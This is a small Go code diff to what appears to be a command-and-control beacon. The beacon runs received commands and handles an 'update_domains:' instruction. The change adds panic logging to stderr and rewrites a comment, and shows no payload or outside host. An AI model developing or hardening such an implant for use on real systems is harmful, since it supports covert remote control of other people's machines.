@@ -135,6 +135,8 @@ func (b *Beacon) executeCommand(command string) string {
 	// Add panic recovery to prevent beacon crash on command execution errors
 	defer func() {
 		if r := recover(); r != nil {
+			// Log panic to stderr for debugging (will be captured in command output if redirected)
+			fmt.Fprintf(os.Stderr, "[Beacon] Panic during command execution: %v\n", r)
 		}
 	}()
 
@@ -560,7 +562,8 @@ func (b *Beacon) runBeacon() {
 				}
 			}()
 
-			// If update_domains was processed, continue to next cycle
+			// If update_domains was processed, the closure returned early
+			// Continue to next cycle
 			if strings.HasPrefix(command, "update_domains:") {
 				continue
 			}
